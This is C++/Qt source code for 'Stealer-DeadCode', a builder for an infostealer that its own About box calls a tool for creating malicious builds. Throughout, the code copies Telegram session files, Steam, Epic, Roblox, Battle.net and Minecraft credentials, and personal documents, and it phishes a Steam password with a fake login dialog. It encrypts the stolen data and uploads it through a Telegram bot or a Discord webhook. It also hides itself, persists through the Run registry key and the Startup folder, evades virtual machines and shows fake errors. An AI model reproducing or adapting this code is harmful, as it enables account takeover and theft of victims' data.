void MainWindow::stealTelegramData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string telegramPath = std::string(appDataPath) + "\\Telegram Desktop\\tdata\\";

    if (std::filesystem::exists(telegramPath)) {
        std::string path = dir + "\\telegram_data";
        QDir().mkpath(QString::fromStdString(path));
        int fileCount = 0;
        for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
            std::string fileName = entry.path().filename().string();
            if (fileName.find("map") != std::string::npos || fileName.find("D877F783D5D3EF8C") != std::string::npos) {
                std::string destPath = path + "\\" + fileName;
                if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(destPath))) {
                    fileCount++;
                }
            }
        }
        emit logUpdated(QString("Сохранено %1 файлов Telegram: %2\n").arg(fileCount).arg(QString::fromStdString(path)));
    }
}

void MainWindow::stealSteamData(const std::string& dir)
{
    char programFiles[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, programFiles);
    std::string steamPath = std::string(programFiles) + "\\Steam\\";
    if (std::filesystem::exists(steamPath)) {
        std::string configPath = steamPath + "config\\loginusers.vdf";
        if (std::filesystem::exists(configPath)) {
            std::string path = dir + "\\steam_loginusers.vdf";
            if (QFile::copy(QString::fromStdString(configPath), QString::fromStdString(path))) {
                emit logUpdated("Steam loginusers.vdf сохранен: " + QString::fromStdString(path) + "\n");
            }
        }
        std::string ssfnPath = steamPath + "ssfn*";
        for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
            if (entry.path().string().find("ssfn") != std::string::npos) {
                std::string path = dir + "\\" + entry.path().filename().string();
                if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(path))) {
                    emit logUpdated("Steam SSFN файл сохранен: " + QString::fromStdString(path) + "\n");
                }
            }
        }
        if (config.steamMAFile) {
            char docPath[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, docPath);
            std::string documentsPath = std::string(docPath);
            for (const auto& entry : std::filesystem::recursive_directory_iterator(documentsPath)) {
                if (entry.path().extension() == ".maFile") {
                    std::string path = dir + "\\" + entry.path().filename().string();
                    if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(path))) {
                        emit logUpdated("Steam MAFile сохранен: " + QString::fromStdString(path) + "\n");
                    }
                }
            }
        }
    }
}

void MainWindow::stealEpicData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string epicPath = std::string(appDataPath) + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
    if (std::filesystem::exists(epicPath)) {
        std::string configPath = epicPath + "GameUserSettings.ini";
        std::string path = dir + "\\epic_settings.ini";
        if (QFile::copy(QString::fromStdString(configPath), QString::fromStdString(path))) {
            emit logUpdated("Данные Epic Games сохранены: " + QString::fromStdString(path) + "\n");
        }
    }
}

void MainWindow::stealRobloxData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string robloxPath = std::string(appDataPath) + "\\Roblox\\GlobalBasicSettings_13.xml";
    if (std::filesystem::exists(robloxPath)) {
        std::string path = dir + "\\roblox_settings.xml";
        if (QFile::copy(QString::fromStdString(robloxPath), QString::fromStdString(path))) {
            emit logUpdated("Данные Roblox сохранены: " + QString::fromStdString(path) + "\n");
        }
    }
}

void MainWindow::stealBattleNetData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string battleNetPath = std::string(appDataPath) + "\\Battle.net\\Battle.net.config";
    if (std::filesystem::exists(battleNetPath)) {
        std::string path = dir + "\\battlenet_config.txt";
        if (QFile::copy(QString::fromStdString(battleNetPath), QString::fromStdString(path))) {
            emit logUpdated("Данные Battle.net сохранены: " + QString::fromStdString(path) + "\n");
        }
    }
}

void MainWindow::stealMinecraftData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string minecraftPath = std::string(appDataPath) + "\\.minecraft\\";
    if (std::filesystem::exists(minecraftPath)) {
        std::string profilesPath = minecraftPath + "launcher_profiles.json";
        std::string path = dir + "\\minecraft_profiles.json";
        if (QFile::copy(QString::fromStdString(profilesPath), QString::fromStdString(path))) {
            emit logUpdated("Профили Minecraft сохранены: " + QString::fromStdString(path) + "\n");
        }

        std::string serversPath = minecraftPath + "servers.dat";
        if (std::filesystem::exists(serversPath)) {
            std::string serverPath = dir + "\\minecraft_servers.dat";
            if (QFile::copy(QString::fromStdString(serversPath), QString::fromStdString(serverPath))) {
                emit logUpdated("Список серверов Minecraft сохранен: " + QString::fromStdString(serverPath) + "\n");
            }
        }
    }
}

void MainWindow::stealFiles(const std::string& dir)
{
    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".jpg", ".png", ".zip", ".rar"};
    char desktopPath[MAX_PATH], docPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);
    SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, docPath);
    std::vector<std::string> paths = {desktopPath, docPath};

    int fileCount = 0;
    for (const auto& path : paths) {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
            if (entry.is_regular_file()) {
                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end() && entry.file_size() < 5 * 1024 * 1024) {
                    std::string destPath = dir + "\\" + entry.path().filename().string();
                    if (QFile::copy(QString::fromStdString(entry.path().string()), QString::fromStdString(destPath))) {
                        fileCount++;
                    }
                }
            }
        }
    }
    emit logUpdated(QString("Собрано %1 файлов: %2\n").arg(fileCount).arg(QString::fromStdString(dir)));
}

void MainWindow::collectSocialEngineeringData(const std::string& dir)
{
    std::string path = dir + "\\social_engineering.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << "Social Engineering Data:\n";
        QString username = QInputDialog::getText(this, "Steam Login", "Enter Steam Username:");
        QString password = QInputDialog::getText(this, "Steam Login", "Enter Steam Password:", QLineEdit::Password);
        out << "Username: " << username << "\n";
        out << "Password: " << password << "\n";
        file.close();
        emit logUpdated("Данные для социальной инженерии собраны: " + QString::fromStdString(path) + "\n");
    }
}

void MainWindow::archiveData(const std::string& dir, const std::string& archivePath)
{
    zip_t *zip = zip_open(archivePath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
    if (zip) {
        QDir dataDir(QString::fromStdString(dir));
        QDirIterator it(dataDir, QDir::Files | QDir::NoDotAndDotDot, QDirIterator::Subdirectories);
        int fileCount = 0;
        while (it.hasNext()) {
            QString filePath = it.next();
            QString relativePath = filePath.mid(dataDir.absolutePath().length() + 1);
            zip_source_t *source = zip_source_file(zip, filePath.toStdString().c_str(), 0, -1);
            if (source && zip_file_add(zip, relativePath.toStdString().c_str(), source, ZIP_FL_OVERWRITE) >= 0) {
                fileCount++;
            } else {
                zip_source_free(source);
            }
        }
        zip_close(zip);
        emit logUpdated(QString("Заархивировано %1 файлов: %2\n").arg(fileCount).arg(QString::fromStdString(archivePath)));
    } else {
        emit logUpdated("Ошибка создания архива\n");
    }
}

void MainWindow::encryptData(const std::string& inputPath, const std::string& outputPath)
{
    QFile file(QString::fromStdString(inputPath));
    if (!file.open(QIODevice::ReadOnly)) {
        emit logUpdated("Ошибка: Не удалось открыть файл для шифрования\n");
        return;
    }
    QByteArray data = file.readAll();
    file.close();

    const auto key1 = GetEncryptionKey(true);
    const auto key2 = GetEncryptionKey(false);
    std::array<unsigned char, 16> iv;
    std::string salt = config.encryptionSalt.empty() ? generateUniqueXorKey() : config.encryptionSalt;
    std::memcpy(iv.data(), salt.c_str(), std::min<size_t>(16, salt.length()));

    QByteArray encryptedData = applyXOR(data, key1);
    emit logUpdated("Применено XOR шифрование\n");

    encryptedData = applyAES(encryptedData, key2, iv);
    emit logUpdated("Применено AES шифрование\n");

    QFile outFile(QString::fromStdString(outputPath));
    if (outFile.open(QIODevice::WriteOnly)) {
        outFile.write(encryptedData);
        outFile.close();
        emit logUpdated("Данные зашифрованы: " + QString::fromStdString(outputPath) + "\n");
    } else {
        emit logUpdated("Ошибка: Не удалось сохранить зашифрованные данные\n");
    }
}

QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key)
{
    QByteArray result = data;
    for (int i = 0; i < result.size(); ++i) {
        result[i] ^= key[i % key.size()];
    }
    return result;
}

QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv)
{
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (status != STATUS_SUCCESS) {
        emit logUpdated("Ошибка открытия алгоритма AES\n");
        return data;
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (status != STATUS_SUCCESS) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emit logUpdated("Ошибка установки режима CBC\n");
        return data;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, const_cast<UCHAR*>(key.data()), key.size(), 0);
    if (status != STATUS_SUCCESS) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emit logUpdated("Ошибка генерации ключа AES\n");
        return data;
    }

    QByteArray paddedData = data;
    int padding = 16 - (data.size() % 16);
    if (padding != 16) paddedData.append(QByteArray(padding, static_cast<char>(padding)));

    QByteArray cipherText(paddedData.size(), 0);
    ULONG cbData = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)paddedData.data(), paddedData.size(), nullptr,
                          const_cast<UCHAR*>(iv.data()), iv.size(), (PUCHAR)cipherText.data(),
                          cipherText.size(), &cbData, BCRYPT_BLOCK_PADDING);
    if (status != STATUS_SUCCESS) {
        emit logUpdated("Ошибка шифрования AES: " + QString::number(status, 16) + "\n");
    } else {
        emit logUpdated("AES шифрование выполнено успешно\n");
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return cipherText.left(cbData);
}

void MainWindow::sendData(const std::string& filePath)
{
    QFileInfo fileInfo(QString::fromStdString(filePath));
    if (fileInfo.size() > 50 * 1024 * 1024) {
        emit logUpdated("Ошибка: Файл слишком большой для отправки (>50 MB)\n");
        return;
    }

    if (config.sendMethod == "telegram") {
        sendToTelegram(filePath);
    } else if (config.sendMethod == "discord") {
        sendToDiscord(filePath);
    } else if (config.sendMethod == "local file") {
        std::string outputPath = QDir::currentPath().toStdString() + "\\stolen_data_encrypted.zip";
        try {
            std::filesystem::copy_file(filePath, outputPath, std::filesystem::copy_options::overwrite_existing);
            emit logUpdated("Данные сохранены локально: " + QString::fromStdString(outputPath) + "\n");
        } catch (const std::exception& e) {
            emit logUpdated("Ошибка сохранения локального файла: " + QString::fromStdString(e.what()) + "\n");
        }
    } else {
        emit logUpdated("Ошибка: Неизвестный метод отправки\n");
    }
}

void MainWindow::sendToTelegram(const std::string& filePath)
{
    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
    QHttpPart textPart;
    textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"chat_id\""));
    textPart.setBody(QString::fromStdString(config.chatId).toUtf8());
    multiPart->append(textPart);

    QFile *file = new QFile(QString::fromStdString(filePath));
    if (file->open(QIODevice::ReadOnly)) {
        QHttpPart filePart;
        filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"document\"; filename=\"stolen_data_encrypted.zip\""));
        filePart.setBodyDevice(file);
        file->setParent(multiPart);
        multiPart->append(filePart);

        QNetworkRequest request(QUrl("https://api.telegram.org/bot" + QString::fromStdString(config.token) + "/sendDocument"));
        QNetworkReply *reply = manager->post(request, multiPart);
        multiPart->setParent(reply);

        connect(reply, &QNetworkReply::finished, this, [this, reply]() {
            if (reply->error() == QNetworkReply::NoError) {
                emit logUpdated("Данные успешно отправлены в Telegram\n");
            } else {
                emit logUpdated("Ошибка отправки в Telegram: " + reply->errorString() + "\n");
            }
            reply->deleteLater();
        });
    } else {
        emit logUpdated("Ошибка: Не удалось открыть файл для отправки в Telegram\n");
        delete file;
        delete multiPart;
    }
}

void MainWindow::sendToDiscord(const std::string& filePath)
{
    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
    QFile *file = new QFile(QString::fromStdString(filePath));
    if (file->open(QIODevice::ReadOnly)) {
        QHttpPart filePart;
        filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"stolen_data_encrypted.zip\""));
        filePart.setBodyDevice(file);
        file->setParent(multiPart);
        multiPart->append(filePart);

        QNetworkRequest request(QUrl(QString::fromStdString(config.token)));
        QNetworkReply *reply = manager->post(request, multiPart);
        multiPart->setParent(reply);

        connect(reply, &QNetworkReply::finished, this, [this, reply]() {
            if (reply->error() == QNetworkReply::NoError) {
                emit logUpdated("Данные успешно отправлены в Discord\n");
            } else {
                emit logUpdated("Ошибка отправки в Discord: " + reply->errorString() + "\n");
            }
            reply->deleteLater();
        });
    } else {
        emit logUpdated("Ошибка: Не удалось открыть файл для отправки в Discord\n");
        delete file;
        delete multiPart;
    }
}

void MainWindow::on_iconBrowseButton_clicked()
{
    QString fileName = QFileDialog::getOpenFileName(this, tr("Выберите иконку"), "", tr("Icon Files (*.ico)"));
    if (!fileName.isEmpty()) {
        ui->iconPathLineEdit->setText(fileName);
        QFile iconFile(fileName);
        if (iconFile.exists()) {
            QIcon icon(fileName);
            setWindowIcon(icon);
            ui->statusbar->showMessage("Иконка обновлена", 3000);
            emit logUpdated("Иконка обновлена: " + fileName + "\n");
        } else {
            QMessageBox::warning(this, "Ошибка", "Выбранный файл иконки не существует!");
            ui->statusbar->showMessage("Ошибка: Файл иконки не найден", 5000);
            emit logUpdated("Ошибка: Файл иконки не найден\n");
        }
    }
}

void MainWindow::on_buildButton_clicked()
{
    if (isBuilding) {
        emit logUpdated("Сборка уже в процессе, подождите завершения\n");
        ui->statusbar->showMessage("Сборка уже в процессе", 3000);
        return;
    }

    isBuilding = true;
    ui->statusbar->showMessage("Сборка начата...", 0);
    ui->textEdit->clear();
    emit logUpdated("Начало сборки DeadCode...\n");

    if (AntiAnalysis()) {
        emit logUpdated("Программа запущена в виртуальной машине. Завершение работы.\n");
        FakeError();
        isBuilding = false;
        return;
    }

    saveConfig("config.txt");

    config.discord = ui->discordCheckBox->isChecked();
    config.steam = ui->steamCheckBox->isChecked();
    config.steamMAFile = ui->steamMAFileCheckBox->isChecked();
    config.epic = ui->epicCheckBox->isChecked();
    config.roblox = ui->robloxCheckBox->isChecked();
    config.battlenet = ui->battlenetCheckBox->isChecked();
    config.minecraft = ui->minecraftCheckBox->isChecked();
    config.cookies = ui->cookiesCheckBox->isChecked();
    config.passwords = ui->passwordsCheckBox->isChecked();
    config.screenshot = ui->screenshotCheckBox->isChecked();
    config.fileGrabber = ui->fileGrabberCheckBox->isChecked();
    config.systemInfo = ui->systemInfoCheckBox->isChecked();
    config.socialEngineering = ui->socialEngineeringCheckBox->isChecked();
    config.chatHistory = ui->chatHistoryCheckBox->isChecked();
    config.telegram = ui->telegramCheckBox->isChecked();
    config.antiVM = ui->antiVMCheckBox->isChecked();
    config.fakeError = ui->fakeErrorCheckBox->isChecked();
    config.silent = ui->silentCheckBox->isChecked();
    config.autoStart = ui->autoStartCheckBox->isChecked();
    config.persist = ui->persistCheckBox->isChecked();
    config.sendMethod = ui->sendMethodComboBox->currentText().toLower().toStdString();
    config.token = ui->tokenLineEdit->text().toStdString();
    config.chatId = ui->chatIdLineEdit->text().toStdString();
    config.filename = ui->fileNameLineEdit->text().toStdString().empty() ? "DeadCode.exe" : ui->fileNameLineEdit->text().toStdString();
    config.encryptionKey1 = ui->encryptionKey1LineEdit->text().toStdString();
    config.encryptionKey2 = ui->encryptionKey2LineEdit->text().toStdString();
    config.encryptionSalt = ui->encryptionSaltLineEdit->text().toStdString();

    if (config.sendMethod == "telegram" && (config.token.empty() || config.chatId.empty())) {
        emit logUpdated("Ошибка: Укажите Telegram токен и Chat ID\n");
        isBuilding = false;
        ui->statusbar->showMessage("Ошибка: Укажите Telegram токен и Chat ID", 5000);
        return;
    }
    if (config.sendMethod == "discord" && config.token.empty()) {
        emit logUpdated("Ошибка: Укажите Discord Webhook URL\n");
        isBuilding = false;
        ui->statusbar->showMessage("Ошибка: Укажите Discord Webhook URL", 5000);
        return;
    }

    JunkCode::executeJunkCode();
    emit logUpdated("Выполнен мусорный код для запутывания\n");

    Stealth();
    Persist();

    generatePolymorphicCode();
    Polymorphic::executePolymorphicCode();
    emit logUpdated("Выполнен полиморфный код для запутывания\n");

    generateBuildKeyHeader();
    copyIconToBuild();
    buildTimer->start(100); // Немедленный запуск сборки
}

void MainWindow::saveConfig(const QString& fileName)
{
    QString actualFileName = fileName.isEmpty() ? QFileDialog::getSaveFileName(this, tr("Сохранить конфигурацию"), "", tr("Config Files (*.txt)")) : fileName;
    if (!actualFileName.isEmpty()) {
        QFile file(actualFileName);
        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream out(&file);
            out << "DISCORD=" << (ui->discordCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "STEAM=" << (ui->steamCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "STEAM_MAFILE=" << (ui->steamMAFileCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "EPIC=" << (ui->epicCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "ROBLOX=" << (ui->robloxCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "BATTLE_NET=" << (ui->battlenetCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "MINECRAFT=" << (ui->minecraftCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "COOKIES=" << (ui->cookiesCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "PASSWORDS=" << (ui->passwordsCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "SCREENSHOT=" << (ui->screenshotCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "FILEGRABBER=" << (ui->fileGrabberCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "SYSTEMINFO=" << (ui->systemInfoCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "SOCIAL_ENGINEERING=" << (ui->socialEngineeringCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "CHAT_HISTORY=" << (ui->chatHistoryCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "TELEGRAM=" << (ui->telegramCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "ANTIVM=" << (ui->antiVMCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "FAKEERROR=" << (ui->fakeErrorCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "SILENT=" << (ui->silentCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "AUTOSTART=" << (ui->autoStartCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "PERSIST=" << (ui->persistCheckBox->isChecked() ? "1" : "0") << "\n";
            out << "SEND_METHOD=" << ui->sendMethodComboBox->currentText() << "\n";
            out << "TOKEN=" << ui->tokenLineEdit->text() << "\n";
            out << "CHAT_ID=" << ui->chatIdLineEdit->text() << "\n";
            out << "FILENAME=" << ui->fileNameLineEdit->text() << "\n";
            out << "ENCRYPTION_KEY1=" << ui->encryptionKey1LineEdit->text() << "\n";
            out << "ENCRYPTION_KEY2=" << ui->encryptionKey2LineEdit->text() << "\n";
            out << "ENCRYPTION_SALT=" << ui->encryptionSaltLineEdit->text() << "\n";
            file.close();
            ui->statusbar->showMessage("Конфигурация сохранена", 3000);
            emit logUpdated("Конфигурация сохранена: " + actualFileName + "\n");
        } else {
            QMessageBox::critical(this, "Ошибка", "Не удалось сохранить конфигурацию!");
            ui->statusbar->showMessage("Ошибка: Не удалось сохранить конфигурацию", 5000);
            emit logUpdated("Ошибка: Не удалось сохранить конфигурацию\n");
        }
    }
}

void MainWindow::loadConfig()
{
    QString fileName = QFileDialog::getOpenFileName(this, tr("Загрузить конфигурацию"), "", tr("Config Files (*.txt)"));
    if (!fileName.isEmpty()) {
        QFile file(fileName);
        if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {
            QTextStream in(&file);
            while (!in.atEnd()) {
                QString line = in.readLine();
                QStringList parts = line.split("=");
                if (parts.size() != 2) continue;

                QString key = parts[0].trimmed();
                QString value = parts[1].trimmed();

                if (key == "DISCORD") ui->discordCheckBox->setChecked(value == "1");
                else if (key == "STEAM") ui->steamCheckBox->setChecked(value == "1");
                else if (key == "STEAM_MAFILE") ui->steamMAFileCheckBox->setChecked(value == "1");
                else if (key == "EPIC") ui->epicCheckBox->setChecked(value == "1");
                else if (key == "ROBLOX") ui->robloxCheckBox->setChecked(value == "1");
                else if (key == "BATTLE_NET") ui->battlenetCheckBox->setChecked(value == "1");
                else if (key == "MINECRAFT") ui->minecraftCheckBox->setChecked(value == "1");
                else if (key == "COOKIES") ui->cookiesCheckBox->setChecked(value == "1");
                else if (key == "PASSWORDS") ui->passwordsCheckBox->setChecked(value == "1");
                else if (key == "SCREENSHOT") ui->screenshotCheckBox->setChecked(value == "1");
                else if (key == "FILEGRABBER") ui->fileGrabberCheckBox->setChecked(value == "1");
                else if (key == "SYSTEMINFO") ui->systemInfoCheckBox->setChecked(value == "1");
                else if (key == "SOCIAL_ENGINEERING") ui->socialEngineeringCheckBox->setChecked(value == "1");
                else if (key == "CHAT_HISTORY") ui->chatHistoryCheckBox->setChecked(value == "1");
                else if (key == "TELEGRAM") ui->telegramCheckBox->setChecked(value == "1");
                else if (key == "ANTIVM") ui->antiVMCheckBox->setChecked(value == "1");
                else if (key == "FAKEERROR") ui->fakeErrorCheckBox->setChecked(value == "1");
                else if (key == "SILENT") ui->silentCheckBox->setChecked(value == "1");
                else if (key == "AUTOSTART") ui->autoStartCheckBox->setChecked(value == "1");
                else if (key == "PERSIST") ui->persistCheckBox->setChecked(value == "1");
                else if (key == "SEND_METHOD") ui->sendMethodComboBox->setCurrentText(value);
                else if (key == "TOKEN") ui->tokenLineEdit->setText(value);
                else if (key == "CHAT_ID") ui->chatIdLineEdit->setText(value);
                else if (key == "FILENAME") ui->fileNameLineEdit->setText(value);
                else if (key == "ENCRYPTION_KEY1") ui->encryptionKey1LineEdit->setText(value);
                else if (key == "ENCRYPTION_KEY2") ui->encryptionKey2LineEdit->setText(value);
                else if (key == "ENCRYPTION_SALT") ui->encryptionSaltLineEdit->setText(value);
            }
            file.close();
            emit logUpdated("Конфигурация загружена из: " + fileName + "\n");
            ui->statusbar->showMessage("Конфигурация загружена", 3000);
        } else {
            emit logUpdated("Ошибка: Не удалось открыть файл конфигурации\n");
        }
    }
}

void MainWindow::exportLogs()
{
    QString fileName = QFileDialog::getSaveFileName(this, tr("Экспорт логов"), "", tr("Log Files (*.log)"));
    if (!fileName.isEmpty()) {
        QFile file(fileName);
        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream out(&file);
            out << ui->textEdit->toPlainText();
            file.close();
            emit logUpdated("Логи экспортированы в: " + fileName + "\n");
            ui->statusbar->showMessage("Логи экспортированы", 3000);
        } else {
            emit logUpdated("Ошибка: Не удалось экспортировать логи\n");
        }
    }
}

void MainWindow::exitApp()
{
    emit logUpdated("Выход из приложения\n");
    QApplication::quit();
}

void MainWindow::showAbout()
{
    QMessageBox::about(this, "О программе",
                       "Stealer-DeadCode v1.0\n"
                       "Создатель: Социопат\n"
                       "Описание: Инструмент для создания вредоносных билдов\n"
                       "Дата: 2025 года\n");
}

void MainWindow::appendLog(const QString& message)
{
    ui->textEdit->append(message);
    ui->textEdit->verticalScrollBar()->setValue(ui->textEdit->verticalScrollBar()->maximum());
}

bool MainWindow::AntiAnalysis()
{
    bool detected = config.antiVM && isRunningInVM();
    if (detected) {
        emit logUpdated("Обнаружена виртуальная машина. Работа программы приостановлена.\n");
    }
    return detected;
}

void MainWindow::Stealth()
{
    if (config.silent) {
        HWND hwnd = GetConsoleWindow();
        if (hwnd) {
            ShowWindow(hwnd, SW_HIDE);
            FreeConsole();
            emit logUpdated("Включен скрытный режим\n");
        }
    }
}

void MainWindow::Persist()
{
    if (config.persist || config.autoStart) {
        QSettings settings("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);
        QString appPath = QCoreApplication::applicationFilePath().replace("/", "\\");
        settings.setValue("DeadCode", appPath);
        emit logUpdated("Программа добавлена в автозапуск через реестр\n");

        std::string sysPath = std::string(std::getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\DeadCode.exe";
        try {
            std::filesystem::copy_file(appPath.toStdString(), sysPath, std::filesystem::copy_options::overwrite_existing);
            emit logUpdated("Программа скопирована в Startup: " + QString::fromStdString(sysPath) + "\n");
        } catch (const std::exception& e) {
            emit logUpdated("Ошибка копирования в Startup: " + QString::fromStdString(e.what()) + "\n");
        }
    }
}

void MainWindow::FakeError()
{
    if (config.fakeError) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 2);
        QStringList errors = {
            "Критическая ошибка: Невозможно загрузить модуль ядра!",
            "Системный сбой: Обнаружено повреждение памяти!",
            "Ошибка приложения: Программа будет закрыта!"
        };
        QMessageBox::critical(this, "Ошибка", errors[dis(gen)]);
        emit logUpdated("Показана фейковая ошибка\n");
    }
}

void MainWindow::on_actionSaveConfig_triggered()
{
    saveConfig();
}

void MainWindow::on_actionLoadConfig_triggered()
{
    loadConfig();
}

void MainWindow::on_actionExportLogs_triggered()
{
    exportLogs();
}

void MainWindow::on_actionExit_triggered()
{
    exitApp();
}

void MainWindow::on_actionAbout_triggered()
{
    showAbout();
}

void MainWindow::replyFinished(QNetworkReply *reply)
{
    if (reply->error() != QNetworkReply::NoError) {
        emit logUpdated("Сетевой запрос завершился с ошибкой: " + reply->errorString() + "\n");
    } else {
        emit logUpdated("Сетевой запрос успешно завершен\n");
    }
}

// Реализация JunkCode (пример полной реализации)
namespace JunkCode {
    void executeJunkCode() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 1000);

        volatile int junk1 = dis(gen);
        volatile int junk2 = dis(gen);
        for (int i = 0; i < 100; ++i) {
            junk1 += junk2;
            junk2 ^= junk1;
            junk1 = (junk1 << 2) | (junk2 >> 3);
        }

        std::vector<int> junkArray(100);
        for (auto& val : junkArray) {
            val = dis(gen);
            val *= junk1;
            val -= junk2;
        }
    }
}